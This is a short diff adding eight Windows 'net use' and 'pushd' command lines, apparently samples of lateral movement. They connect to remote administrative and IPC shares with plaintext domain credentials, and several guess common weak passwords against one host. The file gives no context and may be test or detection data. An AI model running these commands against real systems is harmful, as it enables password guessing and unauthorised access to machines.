@@ -1,0 +1,8 @@
+net  use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
+net  use \\THAIMX\IPC$ /user:"THAIMX\thaim" "1q2w3e4r "
+net  use \\THAIMX\IPC$ /user:"THAIMX\thaim" "ChangeMe! "
+net  use \\THAIMX\IPC$ /user:"THAIMX\thaim" "Password! "
+net  use \\THAIMX\IPC$ /user:"THAIMX\thaim" "Password1 "
+net  use \\THAIMX\IPC$ /user:"THAIMX\thaim" "Spring2022 "
+net use \\192.168.1.100\C$ P@ssw0rd /user:DOMAIN\Administrator
+cmd.exe /c pushd \\192.168.1.100\ADMIN$
